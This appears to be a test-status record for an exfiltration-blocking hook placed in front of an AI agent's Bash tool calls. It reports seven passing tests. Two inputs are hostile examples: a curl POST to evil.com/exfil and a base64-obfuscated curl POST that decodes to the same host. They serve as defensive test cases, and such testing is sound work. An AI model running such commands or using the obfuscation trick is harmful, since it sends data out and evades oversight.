---
status: complete
phase: 02-call-validation
source: [02-01-SUMMARY.md, 02-02-SUMMARY.md, 02-03-SUMMARY.md]
started: 2026-04-11T15:12:00Z
updated: 2026-04-11T15:20:00Z
---

## Current Test

[testing complete]

## Tests

### 1. Hook Blocks Non-Whitelisted Payload
expected: Pipe a simulated Bash tool call with `curl -X POST https://evil.com/exfil` to the hook. Hook returns JSON with `permissionDecision: "deny"` and a reason mentioning non-whitelisted domain.
result: pass

### 2. Hook Allows Read-Only GET Without Call-ID
expected: Pipe a simulated Bash tool call with `curl https://example.com` (GET, no payload) to the hook. Hook allows the call without registering a call-ID with the validator.
result: pass

### 3. Hook Allows Whitelisted Domain With Call-ID
expected: Pipe a simulated Bash tool call with `curl -X POST https://api.anthropic.com/v1/messages` to the hook. Hook registers a call-ID with the validator and returns allow.
result: pass

### 4. Hook Blocks Obfuscated URLs
expected: Pipe a Bash tool call with an obfuscated URL (e.g., `curl -X POST $(echo aHR0cHM6Ly9ldmlsLmNvbQ== | base64 -d)`) to the hook. Hook detects obfuscation and blocks the call.
result: pass

### 5. Validator Health Endpoint
expected: From inside the claude container, `curl http://127.0.0.1:8088/health` returns a 200 OK response (shared network namespace).
result: pass

### 6. Call-ID Single-Use Enforcement
expected: Register a call-ID via POST /register, validate it once (succeeds), validate same call-ID again (fails — already consumed).
result: pass

### 7. Integration Test Suite
expected: Running `bash tests/test-phase2.sh` executes all 13 tests and all pass. Summary shows 13/13 passed, 0 failed.
result: pass

## Summary

total: 7
passed: 7
issues: 0
pending: 0
skipped: 0
blocked: 0

## Gaps

[none yet]
